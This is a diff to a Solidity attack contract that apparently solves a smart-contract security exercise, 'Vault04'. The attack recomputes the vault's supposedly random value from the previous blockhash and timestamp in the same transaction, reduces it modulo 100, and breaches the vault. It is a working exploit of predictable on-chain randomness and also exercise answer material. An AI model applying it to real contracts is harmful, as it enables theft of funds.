@@ -2,7 +2,7 @@
 pragma solidity ^0.8.28;
 
 interface IVault04 {
-    function breachVault(bytes32 _password) external returns (bool);
+    function breachVault(uint256 _password) external returns (bool);
 }
 
 contract Vault04Attack {
@@ -17,15 +17,16 @@ contract Vault04Attack {
     function attack() external returns (bool) {
         // =========================
         // YOUR CODE GOES HERE
-        // vault.breachVault(<PASSWORD>);
 
-        // Compute the password using on-chain values in the same transaction.
-        bytes32 password = keccak256(
-            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
-        );
+        // Compute the guess using on-chain values in the same transaction.
+        uint256 guess = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        ) % 100;
 
-        // Call the unlock function of the vault contract with the computed password
-        return vault.breachVault(password);
+        // Call the breachVault function of the vault contract with the computed guess
+        return vault.breachVault(guess);
         // =========================
     }
 }
